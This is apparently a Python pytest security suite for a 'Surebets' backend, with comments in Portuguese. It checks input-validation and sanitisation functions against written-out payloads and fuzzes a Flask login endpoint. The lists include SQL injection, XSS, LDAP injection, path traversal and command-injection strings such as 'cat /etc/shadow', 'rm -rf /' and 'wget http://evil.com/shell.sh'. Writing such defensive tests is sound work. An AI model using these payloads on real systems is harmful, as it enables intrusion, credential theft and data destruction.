"""
Testes de penetração e performance de segurança para o sistema Surebets.
Inclui testes de carga, fuzzing e cenários de ataque avançados.
"""

import pytest
import time
import sys
import os
from concurrent.futures import ThreadPoolExecutor
from unittest.mock import patch, MagicMock

# Adicionar diretório pai ao path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../../..")))

from backend.core.validation import sanitize_text, detect_sql_injection, detect_xss
from backend.apps import admin_api


class TestAdvancedSQLInjection:
    """Testes avançados de SQL Injection."""

    def test_time_based_sql_injection(self):
        """Testa detecção de SQL injection baseada em tempo."""
        time_based_payloads = [
            "'; WAITFOR DELAY '00:00:05'; --",
            "'; SELECT SLEEP(5); --",
            "admin' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a); --",
            "' OR IF(1=1, SLEEP(5), 0) --",
        ]

        for payload in time_based_payloads:
            assert detect_sql_injection(
                payload
            ), f"Failed to detect time-based SQL injection: {payload}"

    def test_boolean_based_sql_injection(self):
        """Testa detecção de SQL injection booleana."""
        boolean_payloads = [
            "admin' AND (SELECT SUBSTRING(@@version,1,1))='5' --",
            "' OR (SELECT COUNT(*) FROM users)>0 --",
            "admin' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>100 --",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
        ]

        for payload in boolean_payloads:
            assert detect_sql_injection(
                payload
            ), f"Failed to detect boolean SQL injection: {payload}"

    def test_union_based_sql_injection(self):
        """Testa detecção de UNION-based SQL injection."""
        union_payloads = [
            "' UNION SELECT username,password FROM users --",
            "1' UNION ALL SELECT NULL,NULL,version() --",
            "admin' UNION SELECT 1,2,3,4,table_name FROM information_schema.tables --",
            "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --",
        ]

        for payload in union_payloads:
            assert detect_sql_injection(
                payload
            ), f"Failed to detect UNION SQL injection: {payload}"


class TestAdvancedXSS:
    """Testes avançados de XSS."""

    def test_stored_xss_patterns(self):
        """Testa detecção de padrões de XSS armazenado."""
        stored_xss_payloads = [
            "<img src=1 onerror=alert(document.cookie)>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<input type='text' value='' onfocus='alert(\"XSS\")' autofocus>",
            "<marquee onstart=alert('XSS')>test</marquee>",
            "<video><source onerror=\"alert('XSS')\">",
            "<audio src=x onerror=alert('XSS')>",
        ]

        for payload in stored_xss_payloads:
            assert detect_xss(payload), f"Failed to detect stored XSS: {payload}"

    def test_dom_xss_patterns(self):
        """Testa detecção de padrões de DOM XSS."""
        dom_xss_payloads = [
            "javascript:void(alert('XSS'))",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            "vbscript:alert('XSS')",
            "about:blank'><!--<script>alert('XSS')</script>",
            "javascript:/**/alert('XSS')",
        ]

        for payload in dom_xss_payloads:
            assert detect_xss(payload), f"Failed to detect DOM XSS: {payload}"

    def test_filter_bypass_xss(self):
        """Testa detecção de XSS com bypass de filtros."""
        bypass_payloads = [
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script/src=data:,alert('XSS')>",
            "<script>&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;</script>",
            "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
            "<IMG SRC=\"jav\tascript:alert('XSS');\">",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
        ]

        for payload in bypass_payloads:
            # Decodificar se necessário e testar
            decoded_payload = payload.replace("%3C", "<").replace("%3E", ">")
            assert detect_xss(
                decoded_payload
            ), f"Failed to detect filter bypass XSS: {payload}"


class TestPerformanceSecurity:
    """Testes de performance e DoS."""

    def test_large_input_sanitization_performance(self):
        """Testa performance da sanitização com entradas grandes."""
        large_input = "A" * 100000  # 100KB de dados

        start_time = time.time()
        sanitized = sanitize_text(large_input)
        end_time = time.time()

        # Deve processar em menos de 1 segundo
        assert end_time - start_time < 1.0
        assert len(sanitized) > 0

    def test_regex_dos_protection(self):
        """Testa proteção contra ReDoS (Regular Expression DoS)."""
        # Payloads que podem causar ReDoS
        redos_payloads = [
            "a" * 50000 + "X",  # String longa que não faz match
            "(" * 1000 + ")" * 1000,  # Muitos grupos
            "a" * 10000 + "b" * 10000,  # Alternância custosa
        ]

        for payload in redos_payloads:
            start_time = time.time()
            try:
                detect_sql_injection(payload)
                detect_xss(payload)
            except Exception:
                pass  # Aceitar exceções, mas não timeouts
            end_time = time.time()

            # Não deve demorar mais que 2 segundos
            assert (
                end_time - start_time < 2.0
            ), f"ReDoS detected with payload length: {len(payload)}"

    def test_concurrent_validation_performance(self):
        """Testa performance da validação sob carga concorrente."""

        def validate_payload(payload):
            return sanitize_text(payload)

        payloads = [f"Test input {i}" for i in range(100)]

        start_time = time.time()
        with ThreadPoolExecutor(max_workers=10) as executor:
            results = list(executor.map(validate_payload, payloads))
        end_time = time.time()

        # Deve processar 100 validações em menos de 5 segundos
        assert end_time - start_time < 5.0
        assert len(results) == 100


class TestFuzzTesting:
    """Testes de fuzzing para encontrar vulnerabilidades."""

    def test_random_input_fuzzing(self):
        """Testa sanitização com entradas aleatórias."""
        import random
        import string

        # Caracteres perigosos para incluir no fuzzing
        dangerous_chars = [
            "<",
            ">",
            '"',
            "'",
            "&",
            ";",
            "(",
            ")",
            "|",
            "`",
            "$",
            "{",
            "}",
        ]

        for _ in range(50):  # 50 iterações de fuzzing
            # Gerar string aleatória
            length = random.randint(1, 1000)
            chars = string.ascii_letters + string.digits + "".join(dangerous_chars)
            random_input = "".join(random.choice(chars) for _ in range(length))

            try:
                # Não deve gerar exceção
                sanitized = sanitize_text(random_input)
                assert isinstance(sanitized, str)

                # Verificar se não contém scripts perigosos
                assert "<script>" not in sanitized.lower()
                assert "javascript:" not in sanitized.lower()

            except Exception as e:
                pytest.fail(
                    f"Fuzzing failed with input: {random_input[:100]}... Error: {e}"
                )

    def test_unicode_fuzzing(self):
        """Testa sanitização com caracteres Unicode."""
        unicode_payloads = [
            "\u003cscript\u003ealert('XSS')\u003c/script\u003e",  # Unicode encoded script
            "\u0022\u003e\u003cscript\u003ealert('XSS')\u003c/script\u003e",  # Unicode XSS
            "＜script＞alert('XSS')＜/script＞",  # Fullwidth characters
            "ｊａｖａｓｃｒｉｐｔ：alert('XSS')",  # Fullwidth javascript
            "\uff1cscript\uff1ealert('XSS')\uff1c/script\uff1e",  # More fullwidth
        ]

        for payload in unicode_payloads:
            sanitized = sanitize_text(payload)
            # Deve remover ou escapar conteúdo perigoso
            assert "script" not in sanitized.lower() or "&lt;" in sanitized


class TestAPIFuzzTesting:
    """Testes de fuzzing em endpoints da API."""

    @pytest.fixture
    def client(self):
        """Cliente de teste Flask."""
        admin_api.app.config["TESTING"] = True
        admin_api.app.config["JWT_SECRET_KEY"] = "test-secret"

        with patch("backend.apps.admin_api.DatabaseManager") as mock_db:
            db_instance = MagicMock()
            db_instance.fetch_one.return_value = None
            mock_db.return_value = db_instance

            yield admin_api.app.test_client()

    def test_login_endpoint_fuzzing(self, client):
        """Fuzzing do endpoint de login."""
        import random
        import string

        # Gerar payloads de fuzzing
        fuzz_payloads = []
        for _ in range(20):
            username = "".join(
                random.choice(string.ascii_letters + "<>'\"&;|")
                for _ in range(random.randint(1, 100))
            )
            password = "".join(
                random.choice(string.ascii_letters + "0123456789!@#$%")
                for _ in range(random.randint(1, 50))
            )
            fuzz_payloads.append({"username": username, "password": password})

        for payload in fuzz_payloads:
            response = client.post(
                "/api/auth/login", json=payload, content_type="application/json"
            )

            # Não deve retornar 500 (erro interno)
            assert response.status_code != 500, f"Server error with payload: {payload}"
            # Deve retornar erro de validação ou autenticação
            assert response.status_code in [400, 401, 422]

    def test_malformed_json_fuzzing(self, client):
        """Testa endpoints com JSON malformado."""
        malformed_payloads = [
            '{"username": "admin", "password":}',  # JSON incompleto
            '{"username": "admin", "password": "pass"',  # Sem fechamento
            '{username: "admin", "password": "pass"}',  # Sem aspas na chave
            '{"username": admin, "password": "pass"}',  # Valor sem aspas
            "username=admin&password=pass",  # Não é JSON
            '{"username": "admin", "password": "pass", "extra": }',  # Valor ausente
            '{"username": ["admin"], "password": {"pass": "word"}}',  # Tipos incorretos
        ]

        for payload in malformed_payloads:
            response = client.post(
                "/api/auth/login", data=payload, content_type="application/json"
            )

            # Deve retornar erro de formato, não 500
            assert response.status_code in [
                400,
                422,
            ], f"Unexpected response for malformed JSON: {payload}"


class TestSecurityHeadersValidation:
    """Testes detalhados dos headers de segurança."""

    @pytest.fixture
    def client(self):
        """Cliente de teste Flask."""
        admin_api.app.config["TESTING"] = True
        return admin_api.app.test_client()

    def test_csp_header_validation(self, client):
        """Testa se Content Security Policy está configurada corretamente."""
        with patch("backend.apps.admin_api.get_all_adapters", return_value={}):
            response = client.get("/api/status")

            # Se implementado, verificar CSP
            if "Content-Security-Policy" in response.headers:
                csp = response.headers["Content-Security-Policy"]
                assert "default-src" in csp
                assert "'self'" in csp
                # Não deve permitir 'unsafe-eval'
                assert "unsafe-eval" not in csp

    def test_security_headers_comprehensive(self, client):
        """Testa conjunto abrangente de headers de segurança."""
        with patch("backend.apps.admin_api.get_all_adapters", return_value={}):
            response = client.get("/api/status")

            expected_headers = [
                "X-Content-Type-Options",
                "X-Frame-Options",
                "X-XSS-Protection",
            ]

            # Verificar se headers de segurança estão presentes (se implementados)
            for header in expected_headers:
                if header in response.headers:
                    assert response.headers[header] is not None


class TestAdvancedAttackVectors:
    """Testes de vetores de ataque avançados."""

    def test_ldap_injection_detection(self):
        """Testa detecção de LDAP injection (se aplicável)."""
        ldap_payloads = [
            "admin)(&(password=*))",
            "admin)(|(password=*))",
            "*)(&(objectClass=user))",
            "admin)(!(&(password=*)))",
        ]

        for payload in ldap_payloads:
            # Como não temos LDAP específico, testar sanitização geral
            sanitized = sanitize_text(payload)
            # Deve remover ou escapar caracteres perigosos
            assert len(sanitized) <= len(payload)

    def test_command_injection_detection(self):
        """Testa detecção de command injection."""
        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "; cat /etc/shadow",
            "| nc -l 4444",
            "; wget http://evil.com/shell.sh",
            "$(cat /etc/passwd)",
            "`ls -la`",
        ]

        for payload in command_payloads:
            sanitized = sanitize_text(payload)
            # Deve remover ou escapar caracteres de comando
            dangerous_chars = [";", "|", "&", "$", "`"]
            for char in dangerous_chars:
                if char in payload:
                    # Deve ser escapado ou removido
                    assert char not in sanitized or f"&{ord(char)};" in sanitized

    def test_path_traversal_detection(self):
        """Testa detecção de path traversal."""
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
        ]

        for payload in path_payloads:
            sanitized = sanitize_text(payload)
            # Deve neutralizar tentativas de path traversal
            assert "../" not in sanitized or "&lt;" in sanitized
            assert "..\\" not in sanitized or "&lt;" in sanitized


if __name__ == "__main__":
    pytest.main(["-v", __file__])
